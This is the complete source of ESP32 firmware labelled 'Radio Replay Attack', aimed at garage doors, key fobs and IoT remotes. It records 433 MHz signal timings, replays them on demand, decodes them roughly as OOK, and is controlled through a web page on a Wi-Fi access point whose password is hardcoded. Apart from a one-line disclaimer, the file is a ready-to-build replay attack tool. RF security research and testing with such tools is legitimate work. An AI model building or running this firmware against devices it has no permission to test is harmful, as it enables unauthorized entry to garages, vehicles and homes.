/*
 * Radio Replay Attack - ESP32 Firmware
 * Captures and replays simple RF signals for security testing of
 * wireless garage doors, key fobs, and IoT remote controls.
 * FOR AUTHORIZED SECURITY TESTING ONLY.
 */

#include <WiFi.h>
#include <WebServer.h>

#define STATUS_LED  2
#define RF_RX_PIN   13    // 433 MHz receiver data pin
#define RF_TX_PIN   12    // 433 MHz transmitter data pin
#define MAX_SIGNALS 16
#define MAX_PULSES  512

struct CapturedSignal {
    char name[32];
    uint16_t pulses[MAX_PULSES];
    int pulseCount;
    uint32_t frequency;
    uint32_t timestamp;
    int replayCount;
};

CapturedSignal signals[MAX_SIGNALS];
int signalCount = 0;
volatile bool capturing = false;
volatile int captureIdx = 0;
volatile uint32_t lastEdge = 0;
uint16_t tempPulses[MAX_PULSES];

WebServer server(80);

const char* AP_SSID = "RF-Replay-Lab";
const char* AP_PASS = "research2024";

void IRAM_ATTR onRFInterrupt() {
    if (!capturing) return;
    uint32_t now = micros();
    uint32_t duration = now - lastEdge;
    lastEdge = now;

    if (duration > 100 && duration < 50000 && captureIdx < MAX_PULSES) {
        tempPulses[captureIdx++] = (uint16_t)min(duration, (uint32_t)65535);
    }
}

void setup() {
    Serial.begin(115200);
    Serial.println("[RF-REPLAY] Radio Replay Attack Tester");
    pinMode(STATUS_LED, OUTPUT);
    pinMode(RF_RX_PIN, INPUT);
    pinMode(RF_TX_PIN, OUTPUT);
    digitalWrite(RF_TX_PIN, LOW);

    attachInterrupt(digitalPinToInterrupt(RF_RX_PIN), onRFInterrupt, CHANGE);

    WiFi.softAP(AP_SSID, AP_PASS);
    Serial.printf("[NET] Control: %s\n", WiFi.softAPIP().toString().c_str());

    setupRoutes();
    server.begin();
    blinkLED(3, 150);
}

void loop() {
    server.handleClient();

    // Auto-stop capture after timeout
    if (capturing && captureIdx > 10) {
        uint32_t now = micros();
        if (now - lastEdge > 100000) {  // 100ms silence = end of transmission
            capturing = false;
            saveCapture();
        }
    }
}

void blinkLED(int n, int ms) {
    for (int i = 0; i < n; i++) {
        digitalWrite(STATUS_LED, HIGH); delay(ms);
        digitalWrite(STATUS_LED, LOW); delay(ms);
    }
}

void startCapture() {
    captureIdx = 0;
    lastEdge = micros();
    capturing = true;
    Serial.println("[CAPTURE] Listening for RF signal...");
}

void saveCapture() {
    if (captureIdx < 4) {
        Serial.println("[CAPTURE] Too few pulses, discarding");
        return;
    }
    int idx = signalCount % MAX_SIGNALS;
    CapturedSignal* sig = &signals[idx];
    snprintf(sig->name, 32, "signal_%d", signalCount);
    sig->pulseCount = captureIdx;
    memcpy(sig->pulses, tempPulses, captureIdx * sizeof(uint16_t));
    sig->timestamp = millis() / 1000;
    sig->replayCount = 0;
    sig->frequency = 433920000;  // Assumed 433.92 MHz

    signalCount = min(signalCount + 1, MAX_SIGNALS);
    Serial.printf("[CAPTURE] Saved '%s': %d pulses\n", sig->name, sig->pulseCount);
    blinkLED(2, 100);
}

void replaySignal(int index) {
    if (index < 0 || index >= signalCount) return;
    CapturedSignal* sig = &signals[index];

    Serial.printf("[REPLAY] Transmitting '%s' (%d pulses)\n", sig->name, sig->pulseCount);
    detachInterrupt(digitalPinToInterrupt(RF_RX_PIN));

    for (int repeat = 0; repeat < 3; repeat++) {
        for (int i = 0; i < sig->pulseCount; i++) {
            digitalWrite(RF_TX_PIN, i % 2 == 0 ? HIGH : LOW);
            delayMicroseconds(sig->pulses[i]);
        }
        digitalWrite(RF_TX_PIN, LOW);
        delay(10);
    }

    sig->replayCount++;
    attachInterrupt(digitalPinToInterrupt(RF_RX_PIN), onRFInterrupt, CHANGE);
    Serial.println("[REPLAY] Complete");
    blinkLED(1, 200);
}

void analyzeSignal(int index, String& result) {
    if (index < 0 || index >= signalCount) return;
    CapturedSignal* sig = &signals[index];

    // Find timing patterns
    uint16_t shortPulse = 65535, longPulse = 0;
    float avgPulse = 0;
    for (int i = 0; i < sig->pulseCount; i++) {
        if (sig->pulses[i] < shortPulse) shortPulse = sig->pulses[i];
        if (sig->pulses[i] > longPulse) longPulse = sig->pulses[i];
        avgPulse += sig->pulses[i];
    }
    avgPulse /= sig->pulseCount;
    float ratio = (float)longPulse / shortPulse;

    result = "Signal: " + String(sig->name) + "\n";
    result += "Pulses: " + String(sig->pulseCount) + "\n";
    result += "Short: " + String(shortPulse) + " us\n";
    result += "Long: " + String(longPulse) + " us\n";
    result += "Avg: " + String(avgPulse, 0) + " us\n";
    result += "Ratio: " + String(ratio, 2) + "\n";

    // Try to decode as OOK
    result += "\nOOK Decode: ";
    uint16_t threshold = (shortPulse + longPulse) / 2;
    for (int i = 0; i < min(sig->pulseCount, 64); i += 2) {
        result += (sig->pulses[i] > threshold) ? "1" : "0";
    }
    result += "\n";
}

void setupRoutes() {
    server.on("/", HTTP_GET, []() {
        String html = "<html><head><title>RF Replay Lab</title></head><body>";
        html += "<h1>Radio Replay Attack Tester</h1>";
        html += "<p><a href='/capture'>Start Capture</a></p>";

        html += "<h2>Captured Signals (" + String(signalCount) + ")</h2><table border='1'>";
        html += "<tr><th>Name</th><th>Pulses</th><th>Time</th><th>Replays</th><th>Actions</th></tr>";
        for (int i = 0; i < signalCount; i++) {
            html += "<tr><td>" + String(signals[i].name) + "</td>";
            html += "<td>" + String(signals[i].pulseCount) + "</td>";
            html += "<td>" + String(signals[i].timestamp) + "s</td>";
            html += "<td>" + String(signals[i].replayCount) + "</td>";
            html += "<td><a href='/replay?id=" + String(i) + "'>Replay</a> | ";
            html += "<a href='/analyze?id=" + String(i) + "'>Analyze</a> | ";
            html += "<a href='/raw?id=" + String(i) + "'>Raw</a></td></tr>";
        }
        html += "</table></body></html>";
        server.send(200, "text/html", html);
    });

    server.on("/capture", HTTP_GET, []() {
        startCapture();
        server.send(200, "text/plain", "Capturing... send RF signal now");
    });

    server.on("/replay", HTTP_GET, []() {
        int id = server.arg("id").toInt();
        replaySignal(id);
        server.sendHeader("Location", "/"); server.send(302);
    });

    server.on("/analyze", HTTP_GET, []() {
        int id = server.arg("id").toInt();
        String result;
        analyzeSignal(id, result);
        server.send(200, "text/plain", result);
    });

    server.on("/raw", HTTP_GET, []() {
        int id = server.arg("id").toInt();
        if (id < 0 || id >= signalCount) { server.send(404); return; }
        String csv = "index,duration_us\n";
        for (int i = 0; i < signals[id].pulseCount; i++) {
            csv += String(i) + "," + String(signals[id].pulses[i]) + "\n";
        }
        server.send(200, "text/csv", csv);
    });
}
